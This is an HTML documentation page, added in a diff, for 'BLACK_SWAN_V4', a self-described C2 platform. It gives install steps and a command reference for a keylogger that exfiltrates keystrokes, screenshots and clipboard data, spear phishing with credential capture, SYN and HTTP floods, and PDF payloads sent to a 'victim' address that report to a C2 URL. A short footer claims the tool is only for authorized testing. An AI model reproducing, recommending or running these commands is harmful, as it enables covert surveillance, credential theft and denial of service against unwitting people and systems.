@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BLACK_SWAN_V4 · Documentation</title>
+    <!-- Font & Icons -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* ----- RESET & VARIABLES (Black Swan Theme) ----- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        :root {
+            --bg-deep: #0b0b0b;
+            --bg-panel: #131313;
+            --bg-card: #1a1a1a;
+            --border-glow: #2a1a1a;
+            --red-primary: #e63946;
+            --red-bright: #ff4d5a;
+            --red-soft: #b71c1c;
+            --blue-accent: #1e88e5;
+            --blue-glow: #42a5f5;
+            --white: #f0f0f0;
+            --gray-light: #b0b0b0;
+            --gray-mid: #777;
+            --shadow-red: rgba(230, 57, 70, 0.25);
+            --shadow-blue: rgba(30, 136, 229, 0.2);
+            --radius: 16px;
+            --radius-sm: 8px;
+            --font: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        html {
+            scroll-behavior: smooth;
+        }
+        body {
+            font-family: var(--font);
+            background: var(--bg-deep);
+            color: var(--white);
+            line-height: 1.6;
+            min-height: 100vh;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(230,57,70,0.08) 0%, transparent 35%),
+                radial-gradient(circle at 90% 70%, rgba(30,136,229,0.07) 0%, transparent 40%),
+                repeating-linear-gradient(45deg, rgba(255,255,255,0.01) 0px, rgba(255,255,255,0.01) 2px, transparent 2px, transparent 8px);
+        }
+        a { color: var(--blue-accent); text-decoration: none; }
+        a:hover { color: var(--blue-glow); }
+        ::selection { background: var(--red-primary); color: #fff; }
+
+        /* ----- SCROLLBAR (childish flare) ----- */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-deep); }
+        ::-webkit-scrollbar-thumb { background: var(--red-primary); border-radius: 12px; border: 2px solid var(--bg-deep); }
+        ::-webkit-scrollbar-thumb:hover { background: var(--red-bright); }
+
+        /* ----- HEADER / HERO (childish + vibrant) ----- */
+        .hero {
+            padding: 2rem 1.5rem 3rem;
+            text-align: center;
+            border-bottom: 2px solid var(--border-glow);
+            background: linear-gradient(180deg, #0f0f0f 0%, var(--bg-deep) 100%);
+            position: relative;
+            overflow: hidden;
+        }
+        .hero::after {
+            content: "🦢";
+            position: absolute;
+            font-size: 10rem;
+            opacity: 0.04;
+            right: -2rem;
+            bottom: -3rem;
+            transform: rotate(-8deg);
+            pointer-events: none;
+        }
+        .hero-badge {
+            display: inline-block;
+            background: var(--red-soft);
+            color: #fff;
+            font-weight: 600;
+            font-size: 0.75rem;
+            letter-spacing: 2px;
+            padding: 0.3rem 1.2rem;
+            border-radius: 40px;
+            text-transform: uppercase;
+            margin-bottom: 1rem;
+            box-shadow: 0 0 20px var(--shadow-red);
+        }
+        .hero h1 {
+            font-size: clamp(2.8rem, 10vw, 5.5rem);
+            font-weight: 700;
+            letter-spacing: -1px;
+            background: linear-gradient(135deg, #ffffff 0%, #e0e0e0 50%, var(--red-bright) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 0 50px rgba(230,57,70,0.2);
+            margin-bottom: 0.5rem;
+        }
+        .hero h1 span {
+            background: linear-gradient(135deg, var(--blue-accent), var(--blue-glow));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .hero p {
+            max-width: 720px;
+            margin: 0.8rem auto 1.8rem;
+            font-size: 1.2rem;
+            color: var(--gray-light);
+            background: rgba(0,0,0,0.4);
+            padding: 0.6rem 1.5rem;
+            border-radius: 60px;
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(255,255,255,0.04);
+        }
+        .hero .version-tag {
+            display: inline-block;
+            background: rgba(30,136,229,0.15);
+            border: 1px solid rgba(30,136,229,0.25);
+            padding: 0.3rem 1.4rem;
+            border-radius: 40px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: var(--blue-glow);
+        }
+        .hero .version-tag i { margin-right: 6px; }
+
+        /* ----- CONTAINER & LAYOUT ----- */
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 1.5rem 4rem;
+        }
+
+        /* ----- SECTION TITLES (childish doodle style) ----- */
+        .section-title {
+            font-size: 2rem;
+            font-weight: 600;
+            margin: 3rem 0 1.8rem;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            border-left: 5px solid var(--red-primary);
+            padding-left: 1.2rem;
+            background: linear-gradient(90deg, rgba(230,57,70,0.08) 0%, transparent 90%);
+            border-radius: 0 12px 12px 0;
+        }
+        .section-title i {
+            color: var(--red-bright);
+            font-size: 1.8rem;
+        }
+        .section-title span {
+            background: var(--red-primary);
+            font-size: 0.7rem;
+            font-weight: 700;
+            padding: 0.1rem 0.8rem;
+            border-radius: 40px;
+            color: #fff;
+            margin-left: 0.5rem;
+        }
+
+        /* ----- CARDS (black panel + glow) ----- */
+        .card-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 1.8rem;
+            margin: 1.5rem 0 2rem;
+        }
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-glow);
+            border-radius: var(--radius);
+            padding: 1.6rem 1.4rem;
+            transition: all 0.25s ease;
+            backdrop-filter: blur(4px);
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            position: relative;
+            overflow: hidden;
+        }
+        .card::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--red-primary), var(--blue-accent), transparent);
+            opacity: 0.6;
+        }
+        .card:hover {
+            border-color: var(--red-primary);
+            transform: translateY(-4px);
+            box-shadow: 0 12px 40px rgba(230,57,70,0.12), 0 0 30px rgba(30,136,229,0.05);
+        }
+        .card .icon {
+            font-size: 2.4rem;
+            margin-bottom: 0.4rem;
+            display: inline-block;
+            background: rgba(230,57,70,0.08);
+            padding: 0.4rem 0.8rem;
+            border-radius: 12px;
+            color: var(--red-bright);
+        }
+        .card h3 {
+            font-size: 1.25rem;
+            font-weight: 600;
+            margin: 0.6rem 0 0.3rem;
+            color: #fff;
+        }
+        .card p {
+            color: var(--gray-light);
+            font-size: 0.95rem;
+        }
+        .card .cmd-badge {
+            display: inline-block;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.06);
+            padding: 0.2rem 0.8rem;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            font-weight: 500;
+            color: var(--gray-mid);
+            margin-top: 0.6rem;
+            letter-spacing: 0.3px;
+        }
+        .card .cmd-badge i { color: var(--red-primary); margin-right: 4px; }
+
+        /* ----- INSTALL STEPS (step-by-step) ----- */
+        .step-list {
+            background: var(--bg-panel);
+            border-radius: var(--radius);
+            padding: 2rem 2rem 1.5rem;
+            border: 1px solid var(--border-glow);
+            margin: 1rem 0 2rem;
+            counter-reset: step-counter;
+        }
+        .step-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 1.2rem;
+            padding: 0.8rem 0.4rem;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            counter-increment: step-counter;
+        }
+        .step-item:last-child { border-bottom: none; }
+        .step-num {
+            font-weight: 700;
+            font-size: 1.1rem;
+            background: var(--red-primary);
+            color: #fff;
+            width: 32px;
+            height: 32px;
+            border-radius: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            box-shadow: 0 0 16px var(--shadow-red);
+        }
+        .step-content {
+            flex: 1;
+        }
+        .step-content .code-block {
+            background: #0a0a0a;
+            border-left: 3px solid var(--blue-accent);
+            padding: 0.6rem 1.2rem;
+            border-radius: 0 var(--radius-sm) var(--radius-sm) 0;
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            font-size: 0.9rem;
+            color: #d4d4d4;
+            margin: 0.4rem 0 0.2rem;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .step-content .code-block i {
+            color: var(--blue-glow);
+            margin-right: 6px;
+        }
+        .step-content .note {
+            font-size: 0.85rem;
+            color: var(--gray-mid);
+            margin-top: 0.2rem;
+        }
+        .step-content .note i { color: var(--red-primary); }
+
+        /* ----- INSTALL CARD (quick) ----- */
+        .install-quick {
+            background: var(--bg-panel);
+            border-radius: var(--radius);
+            padding: 1.5rem 2rem;
+            border: 1px solid var(--border-glow);
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            gap: 1rem;
+            margin: 1rem 0 2rem;
+        }
+        .install-quick .cmd {
+            background: #0a0a0a;
+            padding: 0.6rem 1.8rem;
+            border-radius: 40px;
+            font-family: monospace;
+            font-size: 1rem;
+            border: 1px solid rgba(255,255,255,0.05);
+            color: var(--blue-glow);
+        }
+        .install-quick .cmd i { color: var(--red-primary); margin-right: 8px; }
+        .install-quick .copy-btn {
+            background: transparent;
+            border: 1px solid var(--red-primary);
+            color: var(--white);
+            padding: 0.4rem 1.4rem;
+            border-radius: 40px;
+            font-weight: 500;
+            transition: 0.2s;
+            cursor: pointer;
+            font-size: 0.9rem;
+        }
+        .install-quick .copy-btn:hover {
+            background: var(--red-primary);
+            color: #fff;
+            box-shadow: 0 0 24px var(--shadow-red);
+        }
+
+        /* ----- TABLE (vibrant childish) ----- */
+        .table-wrap {
+            overflow-x: auto;
+            margin: 1.5rem 0 2rem;
+            border-radius: var(--radius);
+            border: 1px solid var(--border-glow);
+            background: var(--bg-panel);
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.95rem;
+        }
+        th {
+            background: #1e1e1e;
+            color: var(--red-bright);
+            font-weight: 600;
+            padding: 0.9rem 1.2rem;
+            text-align: left;
+            border-bottom: 2px solid var(--border-glow);
+        }
+        td {
+            padding: 0.9rem 1.2rem;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            color: #ddd;
+        }
+        tr:last-child td { border-bottom: none; }
+        tr:hover td { background: rgba(230,57,70,0.04); }
+        .badge {
+            display: inline-block;
+            background: rgba(30,136,229,0.15);
+            color: var(--blue-glow);
+            padding: 0.15rem 0.8rem;
+            border-radius: 40px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            border: 1px solid rgba(30,136,229,0.15);
+        }
+        .badge-red {
+            background: rgba(230,57,70,0.15);
+            color: var(--red-bright);
+            border-color: rgba(230,57,70,0.2);
+        }
+
+        /* ----- FOOTER (playful) ----- */
+        .footer {
+            margin-top: 4rem;
+            padding: 2rem 0 1.5rem;
+            border-top: 1px solid var(--border-glow);
+            text-align: center;
+            color: var(--gray-mid);
+            font-size: 0.9rem;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 1.2rem 2.5rem;
+        }
+        .footer i { color: var(--red-primary); margin: 0 4px; }
+        .footer .swan-icon { font-size: 1.2rem; }
+
+        /* ----- RESPONSIVE TWEAKS ----- */
+        @media (max-width: 650px) {
+            .hero h1 { font-size: 2.6rem; }
+            .step-list { padding: 1.2rem; }
+            .install-quick { flex-direction: column; align-items: stretch; }
+            .install-quick .cmd { text-align: center; }
+            .card-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <!-- HERO / HEADER -->
+    <header class="hero">
+        <div class="hero-badge"><i class="fas fa-shield-alt"></i> v4.0.0 · C2 Platform</div>
+        <h1>🦢 BLACK <span>SWAN</span> V4</h1>
+        <p><i class="fas fa-skull" style="color: var(--red-primary);"></i> 211+ security commands · multi-platform · advanced keylogger · spear phishing · DOS · agent C2</p>
+        <div class="version-tag"><i class="fas fa-code-branch"></i> release · ian carter kulani</div>
+        <div style="margin-top: 1.2rem; display: flex; gap: 0.8rem; justify-content: center; flex-wrap: wrap;">
+            <span style="background: rgba(255,255,255,0.03); padding: 0.2rem 1.2rem; border-radius: 40px; border: 1px solid rgba(255,255,255,0.04);"><i class="fas fa-terminal" style="color: var(--red-primary);"></i> 21000+ commands</span>
+            <span style="background: rgba(255,255,255,0.03); padding: 0.2rem 1.2rem; border-radius: 40px; border: 1px solid rgba(255,255,255,0.04);"><i class="fas fa-robot" style="color: var(--blue-accent);"></i> Discord · Telegram · Slack</span>
+            <span style="background: rgba(255,255,255,0.03); padding: 0.2rem 1.2rem; border-radius: 40px; border: 1px solid rgba(255,255,255,0.04);"><i class="fas fa-key" style="color: var(--red-bright);"></i> Keylogger + exfil</span>
+        </div>
+    </header>
+
+    <div class="container">
+        <!-- STEP-BY-STEP INSTALL (main doc) -->
+        <section>
+            <div class="section-title">
+                <i class="fas fa-rocket"></i> Installation <span>step-by-step</span>
+            </div>
+            <p style="color: var(--gray-light); margin-bottom: 1.2rem;">
+                <i class="fas fa-crown" style="color: var(--red-primary);"></i> 
+                Get BLACK_SWAN_V4 running in minutes. Python 3.7+ required.
+            </p>
+
+            <!-- Quick install card -->
+            <div class="install-quick">
+                <span style="font-weight: 500;"><i class="fas fa-bolt" style="color: var(--red-primary);"></i> quick install</span>
+                <span class="cmd"><i class="fas fa-terminal"></i> pip install -r requirements.txt</span>
+                <button class="copy-btn" id="copyQuickBtn"><i class="far fa-copy"></i> copy</button>
+            </div>
+
+            <!-- Steps -->
+            <div class="step-list">
+                <!-- Step 1 -->
+                <div class="step-item">
+                    <div class="step-num">1</div>
+                    <div class="step-content">
+                        <strong><i class="fas fa-download" style="color: var(--blue-accent);"></i> Clone repository</strong>
+                        <div class="code-block"><i class="fas fa-code"></i> git clone https://github.com/Iankulani/black_swan.git</div>
+                        <div class="note"><i class="fas fa-folder-open"></i> cd black_swan</div>
+                    </div>
+                </div>
+                <!-- Step 2 -->
+                <div class="step-item">
+                    <div class="step-num">2</div>
+                    <div class="step-content">
+                        <strong><i class="fab fa-python" style="color: var(--blue-accent);"></i> Create virtual environment (recommended)</strong>
+                        <div class="code-block"><i class="fas fa-code"></i> python3 -m venv venv</div>
+                        <div class="note"><i class="fas fa-arrow-right"></i> source venv/bin/activate  (Linux/mac)  ·  venv\Scripts\activate (Windows)</div>
+                    </div>
+                </div>
+                <!-- Step 3 -->
+                <div class="step-item">
+                    <div class="step-num">3</div>
+                    <div class="step-content">
+                        <strong><i class="fas fa-cubes"></i> Install core dependencies</strong>
+                        <div class="code-block"><i class="fas fa-code"></i> pip install -r requirements.txt</div>
+                        <div class="note"><i class="fas fa-info-circle"></i> includes: requests, psutil, cryptography, flask, socketio, scapy, paramiko, pynput, discord.py, telethon, slack-sdk, etc.</div>
+                    </div>
+                </div>
+                <!-- Step 4 -->
+                <div class="step-item">
+                    <div class="step-num">4</div>
+                    <div class="step-content">
+                        <strong><i class="fas fa-tools"></i> (Optional) Install system tools</strong>
+                        <div class="code-block"><i class="fas fa-code"></i> sudo apt install nmap nikto whois dnsutils netcat-openbsd docker.io</div>
+                        <div class="note"><i class="fas fa-ubuntu"></i> For macOS: brew install nmap nikto whois netcat docker</div>
+                    </div>
+                </div>
+                <!-- Step 5 -->
+                <div class="step-item">
+                    <div class="step-num">5</div>
+                    <div class="step-content">
+                        <strong><i class="fas fa-play-circle" style="color: var(--red-primary);"></i> Launch BLACK_SWAN_V4</strong>
+                        <div class="code-block"><i class="fas fa-code"></i> python black_swan.py</div>
+                        <div class="note"><i class="fas fa-key"></i> default admin: admin / black_swan_2024  (change immediately)</div>
+                    </div>
+                </div>
+                <!-- Step 6 -->
+                <div class="step-item">
+                    <div class="step-num">6</div>
+                    <div class="step-content">
+                        <strong><i class="fas fa-globe"></i> Web dashboard (optional)</strong>
+                        <div class="code-block"><i class="fas fa-code"></i> web_start 5000  (or use config)</div>
+                        <div class="note"><i class="fas fa-wifi"></i> open http://localhost:5000  ·  black & red cyberpunk UI</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section>
+            <div class="section-title">
+                <i class="fas fa-star"></i> Core Features <span>21k+</span>
+            </div>
+            <div class="card-grid">
+                <div class="card">
+                    <div class="icon"><i class="fas fa-terminal"></i></div>
+                    <h3>Command Arsenal</h3>
+                    <p>Nmap, Curl, Wget, Netcat, Docker, Ping, Traceroute, WHOIS, DNS, SSH, and 20k+ more.</p>
+                    <div class="cmd-badge"><i class="fas fa-tag"></i> 210+ commands</div>
+                </div>
+                <div class="card">
+                    <div class="icon"><i class="fab fa-discord"></i></div>
+                    <h3>Multi-Platform Bots</h3>
+                    <p>Discord · Telegram · Slack · Signal · iMessage · Google Chat · WhatsApp · Web.</p>
+                    <div class="cmd-badge"><i class="fas fa-robot"></i> 8 platforms</div>
+                </div>
+                <div class="card">
+                    <div class="icon"><i class="fas fa-key"></i></div>
+                    <h3>Advanced Keylogger</h3>
+                    <p>Keystroke logging, screenshot capture, clipboard monitoring, exfil via email/C2/Telegram/Discord.</p>
+                    <div class="cmd-badge"><i class="fas fa-skull"></i> F10 toggle</div>
+                </div>
+                <div class="card">
+                    <div class="icon"><i class="fas fa-envelope-open-text"></i></div>
+                    <h3>Spear Phishing</h3>
+                    <p>100+ templates, tracking, credential capture, automated campaigns with SMTP integration.</p>
+                    <div class="cmd-badge"><i class="fas fa-phishing"></i> spear_create</div>
+                </div>
+                <div class="card">
+                    <div class="icon"><i class="fas fa-bolt"></i></div>
+                    <h3>DOS / Traffic Gen</h3>
+                    <p>SYN, UDP, HTTP, ICMP floods · real traffic generation (ICMP/TCP/UDP/HTTP/DNS/ARP).</p>
+                    <div class="cmd-badge"><i class="fas fa-fire"></i> dos_syn · traffic</div>
+                </div>
+                <div class="card">
+                    <div class="icon"><i class="fas fa-network-wired"></i></div>
+                    <h3>Network & IP Mgmt</h3>
+                    <p>IP → domain translation · domain hosting · threat detection · auto-block · Nikto scanner.</p>
+                    <div class="cmd-badge"><i class="fas fa-shield"></i> ip_to_domain</div>
+                </div>
+                <div class="card">
+                    <div class="icon"><i class="fas fa-user-secret"></i></div>
+                    <h3>Agent C2</h3>
+                    <p>Register agents, push commands, heartbeat, result retrieval — full command & control.</p>
+                    <div class="cmd-badge"><i class="fas fa-microchip"></i> agent_register</div>
+                </div>
+                <div class="card">
+                    <div class="icon"><i class="fas fa-file-pdf"></i></div>
+                    <h3>Deployment Engine</h3>
+                    <p>PDF, Email, Link, Executable payloads · track opens/executions · keylogger delivery.</p>
+                    <div class="cmd-badge"><i class="fas fa-rocket"></i> deploy_pdf</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- COMMAND REFERENCE (table) -->
+        <section>
+            <div class="section-title">
+                <i class="fas fa-list-ul"></i> Command Examples <span>quick ref</span>
+            </div>
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Command</th>
+                            <th>Description</th>
+                            <th>Example</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><span class="badge">ping</span></td><td>ICMP echo</td><td><code>ping 8.8.8.8</code></td></tr>
+                        <tr><td><span class="badge badge-red">nmap_quick</span></td><td>Fast port scan</td><td><code>nmap_quick 192.168.1.1</code></td></tr>
+                        <tr><td><span class="badge">curl</span></td><td>HTTP request</td><td><code>curl https://example.com</code></td></tr>
+                        <tr><td><span class="badge badge-red">wget</span></td><td>Download file</td><td><code>wget_download https://file.zip output.zip</code></td></tr>
+                        <tr><td><span class="badge">docker_scan</span></td><td>Vulnerability scan</td><td><code>docker_scan alpine:latest</code></td></tr>
+                        <tr><td><span class="badge badge-red">traffic</span></td><td>Generate traffic</td><td><code>traffic icmp 192.168.1.100 10</code></td></tr>
+                        <tr><td><span class="badge">nikto</span></td><td>Web vuln scan</td><td><code>nikto example.com</code></td></tr>
+                        <tr><td><span class="badge badge-red">dos_syn</span></td><td>SYN flood</td><td><code>dos_syn 192.168.1.100 80 30 100</code></td></tr>
+                        <tr><td><span class="badge">keylogger_start</span></td><td>Start keylogger</td><td><code>keylogger_start</code></td></tr>
+                        <tr><td><span class="badge badge-red">deploy_pdf</span></td><td>PDF payload</td><td><code>deploy_pdf "Invoice" victim@email.com http://c2/log</code></td></tr>
+                        <tr><td><span class="badge">ip_to_domain</span></td><td>Reverse DNS</td><td><code>ip_to_domain 8.8.8.8</code></td></tr>
+                        <tr><td><span class="badge badge-red">host_domain</span></td><td>Host domain</td><td><code>host_domain 192.168.1.100 mydomain.local 8080</code></td></tr>
+                        <tr><td><span class="badge">phish_facebook</span></td><td>Phishing link</td><td><code>phish_facebook</code></td></tr>
+                        <tr><td><span class="badge badge-red">analyze_ip</span></td><td>Full IP analysis</td><td><code>analyze_ip 8.8.8.8</code></td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- CHILDISH / VIBRANT EXTRA (swan theme) -->
+        <div style="display: flex; flex-wrap: wrap; gap: 1.2rem; justify-content: center; margin: 2.5rem 0 1rem; background: var(--bg-panel); padding: 1.5rem; border-radius: var(--radius); border: 1px solid var(--border-glow);">
+            <span style="display: flex; align-items: center; gap: 6px; background: rgba(255,255,255,0.02); padding: 0.2rem 1.2rem; border-radius: 40px;"><i class="fas fa-check-circle" style="color: var(--blue-accent);"></i> 21000+ commands</span>
+            <span style="display: flex; align-items: center; gap: 6px; background: rgba(255,255,255,0.02); padding: 0.2rem 1.2rem; border-radius: 40px;"><i class="fas fa-check-circle" style="color: var(--red-primary);"></i> 8 platform bots</span>
+            <span style="display: flex; align-items: center; gap: 6px; background: rgba(255,255,255,0.02); padding: 0.2rem 1.2rem; border-radius: 40px;"><i class="fas fa-check-circle" style="color: var(--blue-glow);"></i> real traffic gen</span>
+            <span style="display: flex; align-items: center; gap: 6px; background: rgba(255,255,255,0.02); padding: 0.2rem 1.2rem; border-radius: 40px;"><i class="fas fa-check-circle" style="color: var(--red-bright);"></i> keylogger + exfil</span>
+            <span style="display: flex; align-items: center; gap: 6px; background: rgba(255,255,255,0.02); padding: 0.2rem 1.2rem; border-radius: 40px;"><i class="fas fa-check-circle" style="color: var(--red-primary);"></i> DOS / DDOS</span>
+            <span style="display: flex; align-items: center; gap: 6px; background: rgba(255,255,255,0.02); padding: 0.2rem 1.2rem; border-radius: 40px;"><i class="fas fa-check-circle" style="color: var(--blue-accent);"></i> domain hosting</span>
+        </div>
+
+        <!-- FOOTER (swan theme) -->
+        <footer class="footer">
+            <span><i class="fas fa-crown" style="color: var(--red-primary);"></i> BLACK_SWAN_V4 · ian carter kulani</span>
+            <span><i class="fas fa-code"></i> v4.0.0 · documentation</span>
+            <span><i class="fas fa-shield-alt"></i> for authorized security testing only</span>
+            <span class="swan-icon">🦢</span>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // copy quick install command
+            const copyBtn = document.getElementById('copyQuickBtn');
+            if (copyBtn) {
+                copyBtn.addEventListener('click', function() {
+                    const cmdText = 'pip install -r requirements.txt';
+                    navigator.clipboard.writeText(cmdText).then(() => {
+                        const original = copyBtn.innerHTML;
+                        copyBtn.innerHTML = '<i class="fas fa-check"></i> copied!';
+                        setTimeout(() => {
+                            copyBtn.innerHTML = original;
+                        }, 2000);
+                    }).catch(() => {
+                        // fallback
+                        const input = document.createElement('input');
+                        input.value = cmdText;
+                        document.body.appendChild(input);
+                        input.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(input);
+                        copyBtn.innerHTML = '<i class="fas fa-check"></i> copied!';
+                        setTimeout(() => {
+                            copyBtn.innerHTML = '<i class="far fa-copy"></i> copy';
+                        }, 2000);
+                    });
+                });
+            }
+
+            // make all code blocks selectable + add copy icon (optional)
+            document.querySelectorAll('.code-block').forEach(block => {
+                block.style.cursor = 'pointer';
+                block.addEventListener('click', function() {
+                    const text = this.innerText.replace(/[🔗▶▶]/g, '').trim();
+                    navigator.clipboard.writeText(text).catch(() => {});
+                    // visual feedback
+                    this.style.borderLeftColor = '#ff4d5a';
+                    setTimeout(() => { this.style.borderLeftColor = '#1e88e5'; }, 400);
+                });
+            });
+
+            // extra childish sparkle on cards hover (just for fun)
+            document.querySelectorAll('.card').forEach(card => {
+                card.addEventListener('mouseenter', function() {
+                    this.style.transition = 'all 0.2s';
+                });
+            });
+
+            console.log('🦢 BLACK_SWAN_V4 · documentation ready ');
+        });
+    </script>
+
+</body>
+</html>
